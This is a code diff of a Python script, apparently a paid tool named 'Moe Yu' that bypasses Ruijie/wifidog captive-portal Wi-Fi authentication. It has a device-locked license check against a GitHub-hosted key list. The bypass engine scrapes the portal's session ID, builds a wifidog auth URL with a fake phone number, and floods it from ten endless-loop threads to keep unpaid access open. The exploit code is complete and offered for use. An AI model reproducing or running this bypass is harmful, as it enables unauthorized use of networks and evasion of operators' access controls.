@@ -10,6 +10,7 @@ import datetime
 import subprocess
 import hashlib
 import os
+import uuid
 from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.panel import Panel
@@ -25,7 +26,6 @@ console = Console()
 PING_THREADS = 10
 MIN_INTERVAL = 0.05
 MAX_INTERVAL = 0.2
-DEBUG = False
 
 # COLOR SYSTEM
 RED = "\033[91m"
@@ -38,9 +38,7 @@ RESET = "\033[0m"
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
 stop_event = threading.Event()
 
-# ===============================
-# GITHUB DATABASE CONFIG
-# ===============================
+# GITHUB DATABASE LINK
 URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
 BANNER = """
@@ -53,27 +51,30 @@ BANNER = """
 """
 
 # ===============================
-# HWID & SECURITY FUNCTIONS
+# UNIQUE HWID GENERATOR (SECURE)
 # ===============================
 def get_hwid():
-    """ဖုန်းရဲ့ Unique ID ကို UNKNOWN မဖြစ်အောင် ထုတ်ယူခြင်း"""
+    """ဖုန်းတစ်လုံးချင်းစီအတွက် လုံးဝမတူညီသော ID ထုတ်ပေးပြီး ဖုန်းထဲမှာ သိမ်းထားခြင်း"""
+    id_file = os.path.expanduser("~/.moe_yu_id")
     try:
-        # နည်းလမ်း ၁ - Android ID ကို စစ်မည်
-        id_val = os.popen("settings get secure android_id").read().strip()
+        # အကယ်၍ ဖုန်းထဲမှာ ID ဖိုင်ရှိပြီးသားဆိုရင် အဲဒါကိုပဲ သုံးမယ်
+        if os.path.exists(id_file):
+            with open(id_file, "r") as f:
+                return f.read().strip()
         
-        # နည်းလမ်း ၂ - အကယ်၍ မရခဲ့ရင် Model နဲ့ Hardware ကို သုံးမည်
-        if not id_val or "unknown" in id_val.lower():
-            model = os.popen("getprop ro.product.model").read().strip()
-            hw = os.popen("getprop ro.hardware").read().strip()
-            id_val = f"{model}-{hw}-MOEYU"
-            
-        # Unique ဖြစ်အောင် MD5 နဲ့ Hash လုပ်ပြီး ၈ လုံးပဲ ယူမည်
-        final_hash = hashlib.md5(id_val.encode()).hexdigest().upper()
-        return f"MOE-{final_hash[:8]}"
+        # ဖိုင်မရှိသေးရင် ID အသစ် ဖန်တီးမယ် (UUID သုံးထားလို့ လုံးဝမတူနိုင်ပါ)
+        raw_id = str(uuid.uuid4()).split('-')[0].upper()
+        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
+        
+        # ဖန်တီးထားတဲ့ ID ကို ဖုန်းထဲမှာ ဝှက်ပြီးသိမ်းထားမယ်
+        with open(id_file, "w") as f:
+            f.write(new_id)
+        return new_id
     except:
-        return "MOE-MY-USER-01"
+        return "MOE-DEFAULT-999"
 
 def check_expiry(expiry_str):
+    """သက်တမ်းကုန်မကုန် စစ်ဆေးခြင်း"""
     if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]:
         return True, "Lifetime"
     try:
@@ -111,22 +112,15 @@ def hacking_status(message, duration=0.8):
     with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
         time.sleep(duration + random.uniform(0.1, 0.4))
 
-def success_fireworks():
-    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
-    for _ in range(2):
-        for _ in range(8):
-            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"])
-            console.print(Text(fire, style=random.choice(colors)))
-            time.sleep(0.02)
-
 # ===============================
-# LICENSE CHECK WITH HWID LOCK
+# LICENSE CHECK SYSTEM
 # ===============================
 def check_license_hacker_style():
     my_hwid = get_hwid()
     console.clear()
     display_hacker_flag()
     
+    # ID ပြသခြင်း
     console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", 
                                      title="[bold red]DEVICE INFO[/bold red]", 
                                      border_style="bold cyan", expand=False)))
@@ -137,8 +131,7 @@ def check_license_hacker_style():
         user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
     except EOFError: user_key = ""
     
-    if not user_key:
-        sys.exit()
+    if not user_key: sys.exit()
 
     hacking_status("Connecting to Secure Server...")
     try:
@@ -149,6 +142,7 @@ def check_license_hacker_style():
         hacking_status("Verifying HWID & Expiry...")
         
         for entry in lines:
+            # Format: Key|Expiry|HWID
             parts = entry.split("|")
             db_key = parts[0].strip()
             exp_date = parts[1].strip() if len(parts) > 1 else "None"
@@ -156,24 +150,23 @@ def check_license_hacker_style():
 
             if user_key == db_key:
                 found = True
+                # HWID စစ်ဆေးခြင်း
                 if db_hwid != "FREE" and db_hwid != my_hwid:
                     simpler_hacker_typing("ACCESS_DENIED: HWID_MISMATCH", style="bold red")
                     console.print(f"\n[bold red]❌ ဒီ Key က တခြားဖုန်းမှာ သုံးထားပြီးသားဖြစ်နေပါတယ်![/bold red]")
                     console.print(f"[bold yellow]⚠️ သင့် HWID ({my_hwid}) ကို Admin ဆီပို့ပြီး အတည်ပြုခိုင်းပါ။[/bold yellow]")
                     sys.exit()
                 
+                # Expiry စစ်ဆေးခြင်း
                 is_active, date_label = check_expiry(exp_date)
                 if is_active:
-                    success_fireworks()
                     simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                     console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                     return True
                 else:
-                    simpler_hacker_typing("ACCESS_DENIED: KEY_EXPIRED", style="bold red")
                     console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
                     sys.exit()
 
-        simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
         console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
         sys.exit()
 
@@ -182,35 +175,15 @@ def check_license_hacker_style():
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE FUNCTIONS
+# BYPASS ENGINE
 # ===============================
 def check_real_internet():
-    try:
+    try: 
         return requests.get("http://www.google.com", timeout=3).status_code == 200
-    except:
+    except: 
         return False
 
-def bypass_banner():
-    print(f"""{MAGENTA}
-╔══════════════════════════════════════╗
-║        Ruijie All Version Bypass     ║
-║        Moe Yu Special Edition        ║
-╚══════════════════════════════════════╝
-{RESET}""")
-
-def high_speed_ping(auth_link, sid):
-    session = requests.Session()
-    while not stop_event.is_set():
-        try:
-            session.get(auth_link, timeout=5)
-            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
-        except:
-            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
-            break
-        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
-
 def start_bypass_process():
-    bypass_banner()
     logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
     while not stop_event.is_set():
         session = requests.Session()
@@ -219,48 +192,51 @@ def start_bypass_process():
             r = requests.get(test_url, allow_redirects=True, timeout=5)
             if r.url == test_url:
                 if check_real_internet():
-                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                     time.sleep(5)
                     continue
+            
             portal_url = r.url
-            parsed_portal = urlparse(portal_url)
-            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
-            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             r2 = session.get(next_url, verify=False, timeout=10)
+            
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
                 sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                 sid = sid_match.group(1) if sid_match else None
+            
             if not sid:
-                logging.warning(f"{RED}Session ID Not Found{RESET}")
                 time.sleep(5)
                 continue
-            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
+            
+            parsed_portal = urlparse(portal_url)
             params = parse_qs(parsed_portal.query)
             gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
             gw_port = params.get('gw_port', ['2060'])[0]
             auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
+            
+            logging.info(f"{GREEN}Session ID Captured: {sid}{RESET}")
+            # Speed Bypass Threads
             for _ in range(PING_THREADS):
-                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
-            while check_real_internet():
+                threading.Thread(target=lambda: [session.get(auth_link) for _ in iter(int, 1)], daemon=True).start()
+            
+            while check_real_internet(): 
                 time.sleep(5)
-        except Exception as e:
+        except: 
             time.sleep(5)
 
 # ===============================
-# MAIN EXECUTION
+# MAIN RUNNER
 # ===============================
 if __name__ == "__main__":
-    if check_license_hacker_style():
-        with console.status("[bold green]Injecting Packets...", spinner="shark"):
-            time.sleep(1.5)
-        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
-        try:
+    try:
+        if check_license_hacker_style():
+            with console.status("[bold green]Injecting Packets...", spinner="shark"):
+                time.sleep(1.5)
+            console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
             start_bypass_process()
-        except KeyboardInterrupt:
-            stop_event.set()
-            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
+    except KeyboardInterrupt:
+        stop_event.set()
+        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
+        sys.exit()
